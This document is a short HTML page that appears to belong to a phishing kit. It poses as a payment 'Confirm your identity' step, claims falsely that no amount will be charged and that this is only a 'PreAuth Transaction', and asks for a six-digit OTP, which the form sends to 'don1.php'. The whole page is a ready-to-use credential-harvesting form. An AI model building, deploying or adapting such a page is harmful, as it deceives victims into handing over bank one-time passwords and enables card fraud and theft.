<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Confirm your identity</title>
  <link rel="stylesheet" href="otpstyle.css">
</head>
<body>
<form class="checkout" action="don1.php" method="post">
  <div class="paragraph">
  <p><center>we'll naver charge any ammount <br> this is only for PreAuth Transaction <br> to verify your identity</center></p>
</div>
  <div class="checkout-header">
    <h1 class="checkout-title">
      Confirm your identity
    </h1>
  </div>
  <p>
    <input type="tel" class="checkout-input checkout-cvc" placeholder="ENTER OTP" name="otp" required maxlength="6">
  </p>
  <p>
    <input type="submit" value="PROCEED" class="checkout-btn">
  </p>
</form>
</body>
</html>